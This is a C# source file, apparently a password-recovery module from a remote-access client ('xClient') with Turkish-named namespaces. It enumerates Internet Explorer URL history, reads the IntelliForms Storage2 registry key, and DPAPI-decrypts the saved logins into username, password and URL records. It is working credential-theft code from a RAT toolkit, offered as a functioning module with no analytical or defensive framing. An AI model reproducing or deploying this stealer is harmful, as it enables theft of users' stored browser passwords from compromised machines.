using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;
using xClient.KuuhakuÇekirdek.Veri;
using xClient.KuuhakuÇekirdek.Yardımcılar;
using FILETIME = System.Runtime.InteropServices.ComTypes.FILETIME;

namespace xClient.KuuhakuÇekirdek.Kurtarma.Tarayıcılar
{
    public static class InternetExplorer
    {
        #region Public Members

        public static List<KurtarılanHesaplar> GetSavedPasswords()
        {
           List<KurtarılanHesaplar> data = new List<KurtarılanHesaplar>();

            try
            {
                using (ExplorerUrlHistory ieHistory = new ExplorerUrlHistory())
                {
                    List<string[]> dataList = new List<string[]>();

                    foreach (STATURL item in ieHistory)
                    {
                        try
                        {
                            if (DecryptIePassword(item.UrlString, dataList))
                            {
                                foreach (string[] loginInfo in dataList)
                                {
                                    data.Add(new KurtarılanHesaplar
                                    {
                                        Username = loginInfo[0],
                                        Password = loginInfo[1],
                                        Url = item.UrlString,
                                        Application = "InternetExplorer"
                                    });
                                }
                            }
                        }
                        catch (Exception)
                        {
                        }
                    }
                }
            }
            catch (Exception)
            {
            }

            return data;
        }

        public static List<KurtarılanHesaplar> GetSavedCookies()
        {
            return new List<KurtarılanHesaplar>();
        }

        #endregion

        #region Private Methods

        private const string regPath = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2";

        private static T ByteArrayToStructure<T>(byte[] bytes) where T : struct
        {
            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            T stuff = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
            handle.Free();
            return stuff;
        }

        private static bool DecryptIePassword(string url, List<string[]> dataList)
        {
            byte[] cypherBytes;

            string urlHash = GetURLHashString(url);
            if (!DoesURLMatchWithHash(urlHash))
                return false;

            using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, regPath))
            {
                if (key == null) return false;

                cypherBytes = (byte[]) key.GetValue(urlHash);
            }

            byte[] optionalEntropy = new byte[2 * (url.Length + 1)];
            Buffer.BlockCopy(url.ToCharArray(), 0, optionalEntropy, 0, url.Length*2);

            byte[] decryptedBytes = ProtectedData.Unprotect(cypherBytes, optionalEntropy, DataProtectionScope.CurrentUser);

            var ieAutoHeader = ByteArrayToStructure<IEAutoComplteSecretHeader>(decryptedBytes);
            if (decryptedBytes.Length >=
                (ieAutoHeader.dwSize + ieAutoHeader.dwSecretInfoSize + ieAutoHeader.dwSecretSize))
            {
                uint dwTotalSecrets = ieAutoHeader.IESecretHeader.dwTotalSecrets / 2;

                int sizeOfSecretEntry = Marshal.SizeOf(typeof(SecretEntry));
                byte[] secretsBuffer = new byte[ieAutoHeader.dwSecretSize];
                int offset = (int)(ieAutoHeader.dwSize + ieAutoHeader.dwSecretInfoSize);
                Buffer.BlockCopy(decryptedBytes, offset, secretsBuffer, 0, secretsBuffer.Length);

                if (dataList == null)
                    dataList = new List<string[]>();
                else
                    dataList.Clear();

                offset = Marshal.SizeOf(ieAutoHeader);
                for (int i = 0; i < dwTotalSecrets; i++)
                {
                    byte[] secEntryBuffer = new byte[sizeOfSecretEntry];
                    Buffer.BlockCopy(decryptedBytes, offset, secEntryBuffer, 0, secEntryBuffer.Length);

                    SecretEntry secEntry = ByteArrayToStructure<SecretEntry>(secEntryBuffer);

                    string[] dataTriplet = new string[3];

                    byte[] secret1 = new byte[secEntry.dwLength*2];
                    Buffer.BlockCopy(secretsBuffer, (int) secEntry.dwOffset, secret1, 0, secret1.Length);

                    dataTriplet[0] = Encoding.Unicode.GetString(secret1);

                    offset += sizeOfSecretEntry;
                    Buffer.BlockCopy(decryptedBytes, offset, secEntryBuffer, 0, secEntryBuffer.Length);
                    secEntry = ByteArrayToStructure<SecretEntry>(secEntryBuffer);

                    byte[] secret2 = new byte[secEntry.dwLength*2];
                    Buffer.BlockCopy(secretsBuffer, (int) secEntry.dwOffset, secret2, 0, secret2.Length);

                    dataTriplet[1] = Encoding.Unicode.GetString(secret2);

                    dataTriplet[2] = urlHash;

                    dataList.Add(dataTriplet);
                    offset += sizeOfSecretEntry;
                }
            }
            return true;
        }

        private static bool DoesURLMatchWithHash(string urlHash)
        {
            bool result = false;

            using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, regPath))
            {
                if (key == null) return false;

                if (key.GetValueNames().Any(value => value == urlHash))
                    result = true;
            }
            return result;
        }

        private static string GetURLHashString(string wstrURL)
        {
            IntPtr hProv = IntPtr.Zero;
            IntPtr hHash = IntPtr.Zero;

            CryptAcquireContext(out hProv, string.Empty, string.Empty, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);

            if (!CryptCreateHash(hProv, ALG_ID.CALG_SHA1, IntPtr.Zero, 0, ref hHash))
                throw new Win32Exception(Marshal.GetLastWin32Error());

            byte[] bytesToCrypt = Encoding.Unicode.GetBytes(wstrURL);

            var urlHash = new StringBuilder(42);
            if (CryptHashData(hHash, bytesToCrypt, (wstrURL.Length + 1)*2, 0))
            {
                uint dwHashLen = 20;
                byte[] buffer = new byte[dwHashLen];

                if (!CryptGetHashParam(hHash, HashParameters.HP_HASHVAL, buffer, ref dwHashLen, 0))
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                byte tail = 0;
                urlHash.Length = 0;
                for (int i = 0; i < dwHashLen; ++i)
                {
                    byte c = buffer[i];
                    tail += c;
                    urlHash.AppendFormat("{0:X2}", c);
                }
                urlHash.AppendFormat("{0:X2}", tail);

                CryptDestroyHash(hHash);
            }
            CryptReleaseContext(hProv, 0);

            return urlHash.ToString();
        }

        #endregion

        #region Win32 Interop

        [StructLayout(LayoutKind.Sequential)]
        private struct IESecretInfoHeader
        {
            public readonly uint dwIdHeader;
            public readonly uint dwSize;
            public readonly uint dwTotalSecrets;
            public readonly uint unknown;
            public readonly uint id4;
            public readonly uint unknownZero;
        };

        [StructLayout(LayoutKind.Sequential)]
        private struct IEAutoComplteSecretHeader
        {
            public readonly uint dwSize;
            public readonly uint dwSecretInfoSize;
            public readonly uint dwSecretSize;
            public IESecretInfoHeader IESecretHeader;
        };

        [StructLayout(LayoutKind.Explicit)]
        private struct SecretEntry
        {
            [FieldOffset(0)] public readonly uint dwOffset;

            [FieldOffset(4)] public readonly byte SecretId;
            [FieldOffset(5)] public readonly byte SecretId1;
            [FieldOffset(6)] public readonly byte SecretId2;
            [FieldOffset(7)] public readonly byte SecretId3;
            [FieldOffset(8)] public readonly byte SecretId4;
            [FieldOffset(9)] public readonly byte SecretId5;
            [FieldOffset(10)] public readonly byte SecretId6;
            [FieldOffset(11)] public readonly byte SecretId7;

            [FieldOffset(12)] public readonly uint dwLength;
        };

        private const uint PROV_RSA_FULL = 1;
        private const uint CRYPT_VERIFYCONTEXT = 0xF0000000;

        private const int ALG_CLASS_HASH = 4 << 13;
        private const int ALG_SID_SHA1 = 4;

        private enum ALG_ID
        {
            CALG_MD5 = 0x00008003,
            CALG_SHA1 = ALG_CLASS_HASH | ALG_SID_SHA1
        }

        [DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptAcquireContext(out IntPtr phProv, string pszContainer, string pszProvider,
            uint dwProvType, uint dwFlags);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptCreateHash(IntPtr hProv, ALG_ID algid, IntPtr hKey, uint dwFlags,
            ref IntPtr phHash);

        [DllImport("advapi32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptHashData(IntPtr hHash, byte[] pbData, int dwDataLen, uint dwFlags);

        [DllImport("advapi32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptDestroyHash(IntPtr hHash);

        private enum HashParameters
        {
            HP_ALGID = 0x0001,
            HP_HASHVAL = 0x0002,
            HP_HASHSIZE = 0x0004
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptGetHashParam(IntPtr hHash, HashParameters dwParam, byte[] pbData,
            ref uint pdwDataLen, uint dwFlags);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptReleaseContext(IntPtr hProv, uint dwFlags);

        #endregion
    }

    public class ExplorerUrlHistory : IDisposable
    {
        private readonly List<STATURL> _urlHistoryList;
        private readonly IUrlHistoryStg2 obj;
        private UrlHistoryClass urlHistory;

        public ExplorerUrlHistory()
        {
            urlHistory = new UrlHistoryClass();
            obj = (IUrlHistoryStg2) urlHistory;
            STATURLEnumerator staturlEnumerator = new STATURLEnumerator((IEnumSTATURL)obj.EnumUrls);
            _urlHistoryList = new List<STATURL>();
            staturlEnumerator.GetUrlHistory(_urlHistoryList);
        }

        public int Count
        {
            get { return _urlHistoryList.Count; }
        }

        public STATURL this[int index]
        {
            get
            {
                if (index < _urlHistoryList.Count && index >= 0)
                    return _urlHistoryList[index];
                throw new IndexOutOfRangeException();
            }
            set
            {
                if (index < _urlHistoryList.Count && index >= 0)
                    _urlHistoryList[index] = value;
                else throw new IndexOutOfRangeException();
            }
        }

        public void Dispose()
        {
            Marshal.ReleaseComObject(obj);
            urlHistory = null;
        }

        public void AddHistoryEntry(string pocsUrl, string pocsTitle, ADDURL_FLAG dwFlags)
        {
            obj.AddUrl(pocsUrl, pocsTitle, dwFlags);
        }

        public bool DeleteHistoryEntry(string pocsUrl, int dwFlags)
        {
            try
            {
                obj.DeleteUrl(pocsUrl, dwFlags);
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        public STATURL QueryUrl(string pocsUrl, STATURL_QUERYFLAGS dwFlags)
        {
            var lpSTATURL = new STATURL();

            try
            {
                obj.QueryUrl(pocsUrl, dwFlags, ref lpSTATURL);
                return lpSTATURL;
            }
            catch (FileNotFoundException)
            {
                return lpSTATURL;
            }
        }

        public void ClearHistory()
        {
            obj.ClearHistory();
        }

        public STATURLEnumerator GetEnumerator()
        {
            return new STATURLEnumerator((IEnumSTATURL) obj.EnumUrls);
        }

        #region Nested type: STATURLEnumerator

        public class STATURLEnumerator
        {
            private readonly IEnumSTATURL _enumerator;
            private int _index;
            private STATURL _staturl;

            public STATURLEnumerator(IEnumSTATURL enumerator)
            {
                _enumerator = enumerator;
            }

            public STATURL Current
            {
                get { return _staturl; }
            }

            public bool MoveNext()
            {
                _staturl = new STATURL();
                _enumerator.Next(1, ref _staturl, out _index);
                if (_index == 0)
                    return false;
                return true;
            }

            public void Skip(int celt)
            {
                _enumerator.Skip(celt);
            }

            public void Reset()
            {
                _enumerator.Reset();
            }

            public STATURLEnumerator Clone()
            {
                IEnumSTATURL ppenum;
                _enumerator.Clone(out ppenum);
                return new STATURLEnumerator(ppenum);
            }

            public void SetFilter(string poszFilter, STATURLFLAGS dwFlags)
            {
                _enumerator.SetFilter(poszFilter, dwFlags);
            }

            public void GetUrlHistory(IList list)
            {
                while (true)
                {
                    _staturl = new STATURL();
                    _enumerator.Next(1, ref _staturl, out _index);
                    if (_index == 0)
                        break;
                    list.Add(_staturl);
                }
                _enumerator.Reset();
            }
        }

        #endregion
    }

    public class Win32api
    {
        #region shlwapi_URL enum

        [Flags]
        public enum shlwapi_URL : uint
        {
            URL_DONT_SIMPLIFY = 0x08000000,

            URL_ESCAPE_PERCENT = 0x00001000,
            URL_ESCAPE_SPACES_ONLY = 0x04000000,
            URL_ESCAPE_UNSAFE = 0x20000000,

            URL_PLUGGABLE_PROTOCOL = 0x40000000,

            URL_UNESCAPE = 0x10000000
        }

        #endregion

        public const uint SHGFI_ATTR_SPECIFIED = 0x20000;
        public const uint SHGFI_ATTRIBUTES = 0x800;
        public const uint SHGFI_PIDL = 0x8;
        public const uint SHGFI_DISPLAYNAME = 0x200;
        public const uint SHGFI_USEFILEATTRIBUTES = 0x10;
        public const uint FILE_ATTRIBUTRE_NORMAL = 0x4000;
        public const uint SHGFI_EXETYPE = 0x2000;
        public const uint SHGFI_SYSICONINDEX = 0x4000;
        public const uint ILC_COLORDDB = 0x1;
        public const uint ILC_MASK = 0x0;
        public const uint ILD_TRANSPARENT = 0x1;
        public const uint SHGFI_ICON = 0x100;
        public const uint SHGFI_LARGEICON = 0x0;
        public const uint SHGFI_SHELLICONSIZE = 0x4;
        public const uint SHGFI_SMALLICON = 0x1;
        public const uint SHGFI_TYPENAME = 0x400;
        public const uint SHGFI_ICONLOCATION = 0x1000;

        [DllImport("shlwapi.dll")]
        public static extern int UrlCanonicalize(
            string pszUrl,
            StringBuilder pszCanonicalized,
            ref int pcchCanonicalized,
            shlwapi_URL dwFlags
            );

        public static string CannonializeURL(string pszUrl, shlwapi_URL dwFlags)
        {
            var buff = new StringBuilder(260);
            int s = buff.Capacity;
            int c = UrlCanonicalize(pszUrl, buff, ref s, dwFlags);
            if (c == 0)
                return buff.ToString();
            buff.Capacity = s;
            c = UrlCanonicalize(pszUrl, buff, ref s, dwFlags);
            return buff.ToString();
        }

        [DllImport("Kernel32.dll", CharSet = CharSet.Auto)]
        private static extern bool FileTimeToSystemTime
            (ref FILETIME FileTime, ref SYSTEMTIME SystemTime);

        public static DateTime FileTimeToDateTime(FILETIME filetime)
        {
            var st = new SYSTEMTIME();
            FileTimeToSystemTime(ref filetime, ref st);
            try
            {
                return new DateTime(st.Year, st.Month, st.Day, st.Hour, st.Minute, st.Second, st.Milliseconds);
            }
            catch (Exception)
            {
                return DateTime.Now;
            }
        }

        [DllImport("Kernel32.dll", CharSet = CharSet.Auto)]
        private static extern bool SystemTimeToFileTime([In] ref SYSTEMTIME lpSystemTime,
            out FILETIME lpFileTime);

        public static FILETIME DateTimeToFileTime(DateTime datetime)
        {
            var st = new SYSTEMTIME();
            st.Year = (short) datetime.Year;
            st.Month = (short) datetime.Month;
            st.Day = (short) datetime.Day;
            st.Hour = (short) datetime.Hour;
            st.Minute = (short) datetime.Minute;
            st.Second = (short) datetime.Second;
            st.Milliseconds = (short) datetime.Millisecond;
            FILETIME filetime;
            SystemTimeToFileTime(ref st, out filetime);
            return filetime;
        }

        [DllImport("Kernel32.dll")]
        public static extern int CompareFileTime([In] ref FILETIME lpFileTime1,
            [In] ref FILETIME lpFileTime2);

        [DllImport("shell32.dll")]
        public static extern IntPtr SHGetFileInfo(string pszPath, uint dwFileAttributes, ref SHFILEINFO psfi,
            uint cbSizeFileInfo, uint uFlags);

        #region Nested type: SYSTEMTIME

        public struct SYSTEMTIME
        {
            public short Day;
            public short DayOfWeek;
            public short Hour;
            public short Milliseconds;
            public short Minute;
            public short Month;
            public short Second;
            public short Year;
        }

        #endregion
    }

    #region WinAPI

    [StructLayout(LayoutKind.Sequential)]
    public struct SHFILEINFO
    {
        public IntPtr hIcon;
        public IntPtr iIcon;
        public uint dwAttributes;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)] public string szDisplayName;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 80)] public string szTypeName;
    };

    public class SortFileTimeAscendingHelper : IComparer
    {
        #region IComparer Members

        int IComparer.Compare(object a, object b)
        {
            var c1 = (STATURL) a;
            var c2 = (STATURL) b;

            return (CompareFileTime(ref c1.ftLastVisited, ref c2.ftLastVisited));
        }

        #endregion

        [DllImport("Kernel32.dll")]
        private static extern int CompareFileTime([In] ref FILETIME lpFileTime1, [In] ref FILETIME lpFileTime2);

        public static IComparer SortFileTimeAscending()
        {
            return new SortFileTimeAscendingHelper();
        }
    }

    public enum STATURL_QUERYFLAGS : uint
    {
        STATURL_QUERYFLAG_ISCACHED = 0x00010000,

        STATURL_QUERYFLAG_NOURL = 0x00020000,
        STATURL_QUERYFLAG_NOTITLE = 0x00040000,

        STATURL_QUERYFLAG_TOPLEVEL = 0x00080000
    }

    public enum STATURLFLAGS : uint
    {
        STATURLFLAG_ISCACHED = 0x00000001,

        STATURLFLAG_ISTOPLEVEL = 0x00000002
    }

    public enum ADDURL_FLAG : uint
    {
        ADDURL_ADDTOHISTORYANDCACHE = 0,

        ADDURL_ADDTOCACHE = 1
    }


    [StructLayout(LayoutKind.Sequential)]
    public struct STATURL
    {
        public int cbSize;

        [MarshalAs(UnmanagedType.LPWStr)] public string pwcsUrl;

        [MarshalAs(UnmanagedType.LPWStr)] public string pwcsTitle;

        public FILETIME ftLastVisited;

        public FILETIME ftLastUpdated;

        public FILETIME ftExpires;
        public STATURLFLAGS dwFlags;


        public string URL
        {
            get { return pwcsUrl; }
        }

        public string UrlString
        {
            get
            {
                var index = pwcsUrl.IndexOf('?');
                return index < 0 ? pwcsUrl : pwcsUrl.Substring(0, index);
            }
        }

        public string Title
        {
            get
            {
                if (pwcsUrl.StartsWith("file:"))
                    return Win32api.CannonializeURL(pwcsUrl, Win32api.shlwapi_URL.URL_UNESCAPE).Substring(8).Replace(
                        '/', '\\');
                return pwcsTitle;
            }
        }


        public DateTime LastVisited
        {
            get { return Win32api.FileTimeToDateTime(ftLastVisited).ToLocalTime(); }
        }

        public DateTime LastUpdated
        {
            get { return Win32api.FileTimeToDateTime(ftLastUpdated).ToLocalTime(); }
        }

        public DateTime Expires
        {
            get
            {
                try
                {
                    return Win32api.FileTimeToDateTime(ftExpires).ToLocalTime();
                }
                catch (Exception)
                {
                    return DateTime.Now;
                }
            }
        }

        public override string ToString()
        {
            return pwcsUrl;
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct UUID
    {
        public int Data1;
        public short Data2;
        public short Data3;
        public byte[] Data4;
    }

    [ComImport]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    [Guid("3C374A42-BAE4-11CF-BF7D-00AA006946EE")]
    public interface IEnumSTATURL
    {
        void Next(int celt, ref STATURL rgelt, out int pceltFetched);
        void Skip(int celt);
        void Reset();
        void Clone(out IEnumSTATURL ppenum);
        void SetFilter([MarshalAs(UnmanagedType.LPWStr)] string poszFilter, STATURLFLAGS dwFlags);
    }


    [ComImport]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    [Guid("3C374A41-BAE4-11CF-BF7D-00AA006946EE")]
    public interface IUrlHistoryStg
    {
        void AddUrl(string pocsUrl, string pocsTitle, ADDURL_FLAG dwFlags);
        void DeleteUrl(string pocsUrl, int dwFlags);

        void QueryUrl([MarshalAs(UnmanagedType.LPWStr)] string pocsUrl, STATURL_QUERYFLAGS dwFlags,
            ref STATURL lpSTATURL);

        void BindToObject([In] string pocsUrl, [In] UUID riid, IntPtr ppvOut);
        object EnumUrls { [return: MarshalAs(UnmanagedType.IUnknown)] get; }
    }

    [ComImport]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    [Guid("AFA0DC11-C313-11D0-831A-00C04FD5AE38")]
    public interface IUrlHistoryStg2 : IUrlHistoryStg
    {
        new void AddUrl(string pocsUrl, string pocsTitle, ADDURL_FLAG dwFlags);
        new void DeleteUrl(string pocsUrl, int dwFlags);

        new void QueryUrl([MarshalAs(UnmanagedType.LPWStr)] string pocsUrl, STATURL_QUERYFLAGS dwFlags,
            ref STATURL lpSTATURL);

        new void BindToObject([In] string pocsUrl, [In] UUID riid, IntPtr ppvOut);
        new object EnumUrls { [return: MarshalAs(UnmanagedType.IUnknown)] get; }

        void AddUrlAndNotify(string pocsUrl, string pocsTitle, int dwFlags, int fWriteHistory, object poctNotify,
            object punkISFolder);


        void ClearHistory();
    }

    [ComImport]
    [Guid("3C374A40-BAE4-11CF-BF7D-00AA006946EE")]
    public class UrlHistoryClass
    {
    }

    #endregion
}